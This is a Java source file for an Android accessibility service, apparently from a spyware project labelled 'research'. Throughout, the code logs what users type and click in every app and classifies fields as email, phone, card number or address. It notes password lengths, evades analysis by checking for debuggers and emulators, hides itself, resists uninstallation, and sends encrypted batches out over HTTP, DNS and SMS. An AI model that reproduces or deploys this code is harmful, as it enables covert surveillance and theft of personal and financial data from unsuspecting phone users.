package com.research.stealthmonitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.research.stealthmonitor.utils.RealCryptoUtils;
import com.research.stealthmonitor.utils.RealNetworkUtils;
import com.research.stealthmonitor.utils.RealStealthUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Real Accessibility Service implementation for Android monitoring
 * Captures real user interactions and system events
 */
public class RealAccessibilityService extends AccessibilityService {
    
    private static final String TAG = "SystemService";
    private static final String PREFS_NAME = "system_config";
    private static final int MAX_BUFFER_SIZE = 8192;
    
    private RealCryptoUtils cryptoUtils;
    private RealNetworkUtils networkUtils;
    private RealStealthUtils stealthUtils;
    private ExecutorService executorService;
    private StringBuilder dataBuffer;
    private SharedPreferences prefs;
    private File logFile;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        // Initialize stealth utilities first
        stealthUtils = new RealStealthUtils(this);
        
        // Anti-analysis checks
        if (stealthUtils.isDebugging() || stealthUtils.isEmulator() || stealthUtils.isXposed()) {
            Log.d(TAG, "Analysis environment detected, exiting");
            stopSelf();
            return;
        }
        
        // Initialize components
        cryptoUtils = new RealCryptoUtils();
        networkUtils = new RealNetworkUtils(this);
        executorService = Executors.newSingleThreadExecutor();
        dataBuffer = new StringBuilder();
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        
        // Setup log file
        setupLogFile();
        
        // Start stealth operations
        stealthUtils.hideFromRecentApps();
        stealthUtils.preventUninstall();
        
        Log.d(TAG, "Real accessibility service started");
    }
    
    private void setupLogFile() {
        try {
            File dataDir = new File(getFilesDir(), ".system");
            if (!dataDir.exists()) {
                dataDir.mkdirs();
            }
            
            String timestamp = new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date());
            logFile = new File(dataDir, "sys_" + timestamp + ".log");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to setup log file", e);
        }
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        // Process in background thread to avoid blocking
        executorService.execute(() -> processRealEvent(event));
    }
    
    private void processRealEvent(AccessibilityEvent event) {
        try {
            RealEventData eventData = extractRealEventData(event);
            if (eventData != null) {
                storeAndExfiltrateData(eventData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing real event", e);
        }
    }
    
    private RealEventData extractRealEventData(AccessibilityEvent event) {
        RealEventData data = new RealEventData();
        
        data.timestamp = System.currentTimeMillis();
        data.eventType = event.getEventType();
        data.packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        data.className = event.getClassName() != null ? event.getClassName().toString() : "";
        
        // Extract text content
        if (event.getText() != null && !event.getText().isEmpty()) {
            StringBuilder textBuilder = new StringBuilder();
            for (CharSequence text : event.getText()) {
                textBuilder.append(text);
            }
            data.textContent = textBuilder.toString();
        }
        
        // Get window information
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            try {
                data.viewId = source.getViewIdResourceName();
                data.contentDescription = source.getContentDescription() != null ? 
                                        source.getContentDescription().toString() : "";
                
                // Extract password fields
                if (source.isPassword()) {
                    data.isPassword = true;
                    data.textContent = "[PASSWORD:" + (data.textContent != null ? data.textContent.length() : 0) + "]";
                }
                
                // Extract form data
                if (isFormField(source)) {
                    data.isFormField = true;
                    data.formFieldType = getFormFieldType(source);
                }
                
            } finally {
                source.recycle();
            }
        }
        
        // Filter relevant events
        return isRelevantEvent(data) ? data : null;
    }
    
    private boolean isFormField(AccessibilityNodeInfo node) {
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        return className.contains("EditText") || 
               className.contains("AutoCompleteTextView") ||
               className.contains("TextInputEditText");
    }
    
    private String getFormFieldType(AccessibilityNodeInfo node) {
        if (node.isPassword()) return "password";
        
        String hint = node.getHintText() != null ? node.getHintText().toString().toLowerCase() : "";
        String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
        
        if (hint.contains("email") || desc.contains("email")) return "email";
        if (hint.contains("phone") || desc.contains("phone")) return "phone";
        if (hint.contains("credit") || hint.contains("card")) return "credit_card";
        if (hint.contains("address")) return "address";
        
        return "text";
    }
    
    private boolean isRelevantEvent(RealEventData data) {
        // Filter out system events and focus on user input
        switch (data.eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return true;
            default:
                return false;
        }
    }
    
    private void storeAndExfiltrateData(RealEventData eventData) {
        try {
            // Encrypt the data
            String jsonData = eventData.toJson();
            String encryptedData = cryptoUtils.encryptAES(jsonData);
            
            // Add to buffer
            synchronized (dataBuffer) {
                dataBuffer.append(encryptedData).append("\\n");
                
                // Write to local file as backup
                writeToLogFile(encryptedData);
                
                // Exfiltrate when buffer is full
                if (dataBuffer.length() > MAX_BUFFER_SIZE) {
                    String bufferContent = dataBuffer.toString();
                    dataBuffer.setLength(0);
                    
                    // Exfiltrate via multiple channels
                    networkUtils.exfiltrateViaHTTP(bufferContent);
                    networkUtils.exfiltrateViaDNS(bufferContent);
                    networkUtils.exfiltrateViaSMS(bufferContent);
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to store/exfiltrate data", e);
        }
    }
    
    private void writeToLogFile(String encryptedData) {
        if (logFile != null) {
            try (FileOutputStream fos = new FileOutputStream(logFile, true)) {
                fos.write((encryptedData + "\\n").getBytes());
                fos.flush();
            } catch (IOException e) {
                Log.e(TAG, "Failed to write to log file", e);
            }
        }
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        // Configure service for maximum coverage
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Capture all event types
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_SELECTED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        
        // Maximum access flags
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_FINGERPRINT_GESTURES;
        }
        
        // Monitor all packages
        info.packageNames = null;
        
        setServiceInfo(info);
        
        Log.d(TAG, "Real accessibility service configured and connected");
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }
    
    @Override
    public void onDestroy() {
        // Exfiltrate remaining data
        synchronized (dataBuffer) {
            if (dataBuffer.length() > 0) {
                String remainingData = dataBuffer.toString();
                networkUtils.exfiltrateViaHTTP(remainingData);
            }
        }
        
        if (executorService != null) {
            executorService.shutdown();
        }
        
        super.onDestroy();
        Log.d(TAG, "Real accessibility service destroyed");
    }
    
    /**
     * Real event data structure
     */
    private static class RealEventData {
        long timestamp;
        int eventType;
        String packageName;
        String className;
        String textContent;
        String viewId;
        String contentDescription;
        boolean isPassword;
        boolean isFormField;
        String formFieldType;
        
        String toJson() {
            return String.format(
                "{\"ts\":%d,\"type\":%d,\"pkg\":\"%s\",\"class\":\"%s\",\"text\":\"%s\",\"id\":\"%s\",\"desc\":\"%s\",\"pwd\":%b,\"form\":%b,\"ftype\":\"%s\"}",
                timestamp, eventType, packageName, className, 
                textContent != null ? textContent.replace("\"", "\\\\\"") : "",
                viewId != null ? viewId : "",
                contentDescription != null ? contentDescription.replace("\"", "\\\\\"") : "",
                isPassword, isFormField, formFieldType != null ? formFieldType : ""
            );
        }
    }
}